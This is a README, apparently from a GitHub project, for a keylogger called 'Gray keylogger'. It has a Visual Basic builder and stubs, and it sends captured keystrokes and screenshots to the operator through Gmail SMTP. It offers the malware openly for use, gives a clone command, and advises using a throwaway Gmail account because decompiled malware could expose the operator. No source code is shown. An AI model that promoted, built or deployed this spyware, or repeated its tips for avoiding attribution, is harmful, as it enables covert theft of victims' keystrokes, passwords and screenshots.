<h2> Some words</h2>
<p>I made this keylogger both GUI + stub in Visual Basic. C# was similar so I also added C# stub. I am also planning to add more stubs in different languages for different plateforms. Developers are always incouraged to contribute. Users can contribute by using this keylogger and reporting bugs/errors.</p>
<p>I will be more happy if this keylogger has more stubs and supported plateforms.</p>
<p>Gray keylogger was my first programming project. As time past, I started updating. Its third version. Now it is an ideal example for all of us who want to code and keep on moving.</p>

<h2> Usage</h2>
<pre><code>git clone https://github.com/DarkSecDevelopers/GrayKeylogger.git</code></pre>

<h2> Warnings</h2>
<ul>
<li>Don't use your personal gmail. Malware can be easily decompiled and hence you will be get in trouble.</li>
<li>Make sure allow <a href="https://myaccount.google.com/lesssecureapps">LessSecureApps</a> in provided email. Else it won't work.</li>
<li>There is no warranty + gurranty. It uses gmail smtp server to send logs & screenshot.</li>
<li>Gmail smtp server has an limit of 100 messages per 24 hours, So make sure logsize is greator than 10000 = 10KB.</li>
<li>Sometimes it shows error when error reporting option is checked that smtp server requires secure connection, Thats mean either LessSecureApps don't allowed or pass or email incorrect.</li>
<li>Currently <b>Don't use C# language option</b>, It is not tested and not stable.</li>
</ul>
